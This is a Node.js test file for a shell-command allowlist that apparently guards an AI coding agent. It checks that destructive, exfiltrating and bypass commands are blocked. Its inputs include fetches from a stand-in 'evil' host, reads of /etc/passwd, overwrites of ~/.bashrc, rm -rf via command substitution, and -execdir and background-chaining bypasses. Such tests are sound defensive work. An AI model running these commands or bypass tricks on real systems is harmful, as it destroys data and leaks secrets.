'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');

const { isCommandAllowed } = require('../../../.claude/lib/safety/command-allowlist.cjs');

test('does not treat harmless substrings as dangerous flags', () => {
  const verdict = isCommandAllowed('find . -name "firmware.txt"');
  assert.equal(verdict.allowed, true);
});

test('blocks dangerous token usage for find', () => {
  const verdict = isCommandAllowed('find . -name "*.tmp" -exec rm {} \\;');
  assert.equal(verdict.allowed, false);
  assert.match(verdict.reason || '', /dangerous flag/i);
});

test('blocks dangerous token usage for git', () => {
  const verdict = isCommandAllowed('git reset --hard HEAD~1');
  assert.equal(verdict.allowed, false);
  assert.match(verdict.reason || '', /(dangerous flag|does not match allowed patterns)/i);
});

test('blocks command substitution with $() even for allowlisted commands', () => {
  const verdict = isCommandAllowed('echo $(rm -rf /tmp/demo)');
  assert.equal(verdict.allowed, false);
});

test('blocks backtick command substitution even for allowlisted commands', () => {
  const verdict = isCommandAllowed('echo `whoami`');
  assert.equal(verdict.allowed, false);
});

test('blocks command chained after background operator &', () => {
  // `grep` is allowed but the backgrounded `wget` must still be inspected/blocked.
  const verdict = isCommandAllowed('grep x . & wget http://evil -O y');
  assert.equal(verdict.allowed, false);
});

test('blocks output redirection that would overwrite arbitrary files', () => {
  const verdict = isCommandAllowed('echo pwned > ~/.bashrc');
  assert.equal(verdict.allowed, false);
  assert.match(verdict.reason || '', /redirection/i);
});

test('blocks input/append redirection for allowlisted commands', () => {
  assert.equal(isCommandAllowed('cat secret >> /tmp/exfil').allowed, false);
  assert.equal(isCommandAllowed('cat < /etc/passwd').allowed, false);
});

test('does not flag redirection characters that are inside quotes', () => {
  // `>` inside a quoted argument is not a shell redirection.
  const verdict = isCommandAllowed('grep "a->b" .');
  assert.equal(verdict.allowed, true);
});

test('blocks find -execdir bypass of -exec guard', () => {
  const verdict = isCommandAllowed('find . -execdir curl http://evil {} \\;');
  assert.equal(verdict.allowed, false);
  assert.match(verdict.reason || '', /dangerous flag/i);
});

test('blocks inline Node.js evaluation flags', () => {
  assert.equal(isCommandAllowed('node -e "require(\\"fs\\").rmSync(\\"tmp\\")"').allowed, false);
  assert.equal(isCommandAllowed('node --eval "process.exit(0)"').allowed, false);
  assert.equal(isCommandAllowed('node -p "process.env"').allowed, false);
  assert.equal(isCommandAllowed('node --print "process.env"').allowed, false);
});

test('allows normal Node.js file, test runner, and syntax-check commands', () => {
  assert.equal(isCommandAllowed('node scripts/check-config.cjs').allowed, true);
  assert.equal(
    isCommandAllowed('node --test tests/lib/safety/command-allowlist.test.cjs').allowed,
    true
  );
  assert.equal(isCommandAllowed('node --check .claude/hooks/example.cjs').allowed, true);
});
